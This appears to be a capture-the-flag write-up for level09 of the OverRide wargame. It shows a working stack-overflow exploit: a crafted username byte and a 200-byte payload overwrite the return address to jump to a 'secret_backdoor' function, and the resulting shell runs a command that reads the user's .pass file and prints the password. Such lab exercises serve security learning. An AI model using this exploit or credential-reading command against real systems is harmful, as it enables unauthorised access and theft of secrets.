## level09

This level is somewhat convoluted

```console
level09@OverRide:~$ python -c "print('A' * 40 + chr(255))" | python -c "print([ord(b) for b in __import__('sys').stdin.read()])"
[65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 255, 10]
```

[rbp+8]   → return address
[rbp]     → saved rbp
[rbp-192] → `buf`

```
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

```
level09@OverRide:~$ (python -c "print('A' * 40 + chr(255)) ; print('A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')" ; cat) | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/$(whoami)/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```